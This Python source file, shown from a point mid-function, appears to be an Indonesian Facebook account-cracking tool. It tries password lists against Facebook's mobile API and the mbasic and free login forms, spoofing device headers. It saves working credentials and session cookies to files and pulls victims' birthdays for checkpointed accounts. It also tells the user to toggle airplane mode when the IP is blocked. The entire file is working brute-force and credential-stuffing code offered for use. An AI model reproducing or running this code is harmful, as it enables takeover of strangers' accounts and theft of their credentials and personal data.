					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r %s[CP] %s|%s        "%(K,uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
		elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in send.text:
			print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
			c+=1
			sys.stdout.flush()
			api(uid, pwx)
		else:
			continue

	loop += 1

### CRACK API ###
def api(uid, pwx):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			if "y" in opsi:
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				ceker(uid,pw,ua)
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
			elif "t" in opsi:
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r %s[CP] %s|%s        "%(K,uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
		elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in send.text:
			print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
			c+=1
			sys.stdout.flush()
			api(uid, pwx)
		else:
			continue

	loop += 1

### CRACK MBASIC M FB ###
def crack(uid, pwx, host, **kwargs):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r %s[OK] %s|%s|%s"%(H,uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				if "y" in opsi:
					try:
						token = open("token.txt", "r").read()
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan[month]
						print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
					ceker(uid,pw,ua)
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
					break
				elif "t" in opsi:
					try:
						token = open("token.txt", "r").read()
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan[month]
						print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
					print("\r %s[CP] %s|%s        "%(K,uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
					break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")
def ceker(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
		for opt in range(len(ngew)):
			print("  "+N+"["+str(opt+1)+"]. "+ngew[opt]+" ")
		if "0" in str(len(ngew)):
			print("\r %s[âœ“] akun tap yes, login di lite       "%(H))
	elif "login_error" in str(run):
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
	else:
		print("\r %s[CP] %s|%s        "%(K,uid, pw))

if __name__=='__main__':
	os.system('git pull')
	menu()
